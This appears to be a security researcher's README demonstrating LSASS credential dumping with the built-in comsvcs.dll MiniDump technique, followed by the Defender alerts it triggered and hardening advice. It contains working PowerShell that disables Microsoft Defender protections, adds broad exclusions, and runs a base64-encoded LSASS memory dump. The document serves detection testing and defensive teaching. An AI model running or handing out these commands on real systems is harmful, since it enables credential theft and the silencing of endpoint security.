# LSASS dumping, MiniDump
Hackers might target LSASS to grab login credentials stored in its memory. 
After a user logs in, LSASS stores important credential info that can be stolen by attackers to move through a system using different authentication details.

Microsoft Defender for Endpoint and Defender Antivirus effectively prevent and detect LSASS dumping activities. 
Now, I'd like to demonstrate the detection perspective by ***capturing all activities and correlating multiple alerts into a single incident***.

## Red Note (test insights)
**PowerShell, LSASS credential dumping, Built-in Windows tool** 
```powershell
$lsassPID = (Get-Process -Name lsass).Id
cmd.exe /C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\temp\out.dmp full" 
```

**Attack Script**
- [x] Download [a script](https://github.com/LearningKijo/ResearchDev/blob/main/DEV/DEV04-LSASSdumping-MiniDump/Dev04Ninja.ps1) ↓

```powershell
# Disable Microsoft Defender Antivrus tool
Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath "C:\" -DisableBlockAtFirstSeen $true -DisableEmailScanning $true -DisableScriptScanning $true -ExclusionExtension "exe"

# Create "C:\temp" for a dump file
$tempDir = "C:\temp"
if (-not (Test-Path $tempDir -PathType Container)) {
        New-Item -Path $tempDir -ItemType Directory
}

# Wait for 10 seconds
Start-Sleep -Seconds 10

# LSASS dumping using the built-in Windows tool, Encoded by Base64
powershell.exe -e JABsAHMAYQBzAHMAUABJAEQAIAA9ACAAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABsAHMAYQBzAHMAKQAuAEkAZAANAAoAYwBtAGQALgBlAHgAZQAgAC8AQwAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHIAdQBuAGQAbABsADMAMgAuAGUAeABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbwBtAHMAdgBjAHMALgBkAGwAbAAsACAATQBpAG4AaQBEAHUAbQBwACAAJABsAHMAYQBzAHMAUABJAEQAIABDADoAXAB0AGUAbQBwAFwAbwB1AHQALgBkAG0AcAAgAGYAdQBsAGwAIgA=
```
> [!Note]
> This script will perform the following actions:
> 1. Disable Microsoft Defender Antivrus tool
> 2. Create "C:\temp" for a dump file
> 3. LSASS dumping using the built-in Windows tool (Encoded by Base64)
> 
> Make sure that [MDE Tamper Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide&ocid=magicti_ta_learndoc) is disabled.

## Alerts & Detections
After running the script, these alerts were generated and correlated into a single incident in Microsoft Defender XDR portal.
- [x] Suspicious PowerShell command line
- [x] Sensitive credential memory read
- [x] Suspicious process executed PowerShell command
- [x] Suspicious access to LSASS service
- [x] Process memory dump
- [x] Suspicious Process Discovery
- [x] Suspicious Microsoft Defender Antivirus exclusion
- [x] Attempt to turn off Microsoft Defender Antivirus protection

![image](https://github.com/LearningKijo/ResearchDev/assets/120234772/b7f1dc16-ac2a-4032-9f77-fd1cd1074318)

![image](https://github.com/LearningKijo/ResearchDev/assets/120234772/98f5cf84-59e7-46ee-a9ad-58434efedd83)

## Blue Note
- Turn on [Microsoft Defender Antvirus](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/next-generation-protection?view=o365-worldwide) (Including Real-Time Protection, Cloud Protection, Sample Submission and so on)
- Enable ASR rules, [
Block credential stealing from the Windows local security authority subsystem](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-credential-stealing-from-the-windows-local-security-authority-subsystem)
- Onboarding [Microsoft Defender for Endpoint](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-endpoint?view=o365-worldwide)
- Turn on Microsoft Defender for Endpoint, [Tamper Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide&ocid=magicti_ta_learndoc)

Windows administrators can also perform the following to further harden the LSASS process on their devices:
- Enable [PPL for LSASS process](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#BKMK_HowToConfigure); note that for new, enterprise-joined Windows 11 installs (22H2 update), this is already enabled by default
- Enable [Windows Defender Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/configure?tabs=intune#enable-windows-defender-credential-guard); this is also now enabled by default for organizations using the Enterprise edition of Windows 11
- Enable [restricted admin mode](https://learn.microsoft.com/en-us/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-7-2008-r2) for Remote Desktop Protocol (RDP)
- Disable [“UseLogonCredential” in WDigest](https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649)

## Reference
- [OS Credential Dumping: LSASS Memory, T1003.001](https://attack.mitre.org/techniques/T1003/001/)
- [Detecting and preventing LSASS credential dumping attacks](https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/)

#### Disclaimer
The views and opinions expressed herein are those of the author and do not necessarily reflect the views of company.
